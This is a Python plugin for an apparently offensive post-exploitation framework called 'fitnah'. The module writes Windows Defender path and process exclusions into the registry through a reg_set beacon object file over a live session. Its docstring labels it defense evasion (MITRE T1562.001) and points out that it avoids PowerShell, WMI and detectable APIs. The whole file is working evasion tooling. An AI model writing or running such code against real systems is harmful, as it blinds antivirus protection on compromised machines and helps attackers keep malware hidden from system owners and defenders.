"""defense_evasion/defender_exclude — add Defender path/process exclusions via reg BOF. MITRE T1562.001

Uses TrustedSec reg_set BOF to write exclusion keys directly in the registry
via NtSetValueKey — no PowerShell Set-MpPreference, no WMI, no detectable API.
"""
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class DefenderExclude(BasePlugin):
    NAME        = "defender_exclude"
    DESCRIPTION = "Add Windows Defender path/process exclusion via reg_set BOF. No PowerShell."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1562.001"
    CATEGORY    = "defense_evasion"
    schema      = ParamSchema().add(
        Param("path",    str, required=False, default="",
              help="Path exclusion (e.g. C:\\\\Windows\\\\Temp)"),
        Param("process", str, required=False, default="",
              help="Process exclusion (e.g. svchost.exe)"),
    )

    @mitre("T1562.001")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        path    = params.get("path", "").strip()
        process = params.get("process", "").strip()
        if not path and not process:
            return ModuleResult.err("Provide path or process to exclude")

        results = []
        base = r"SOFTWARE\Microsoft\Windows Defender\Exclusions"

        if path:
            key   = f"{base}\\Paths"
            args  = ctx.bof_pack("zzi", key, path, 0)
            r     = ctx.bof("reg_set", args_b64=args, timeout=15)
            results.append(f"path exclusion: {r['output']}")

        if process:
            key   = f"{base}\\Processes"
            args  = ctx.bof_pack("zzi", key, process, 0)
            r     = ctx.bof("reg_set", args_b64=args, timeout=15)
            results.append(f"process exclusion: {r['output']}")

        return ModuleResult.ok(data="\n".join(results))
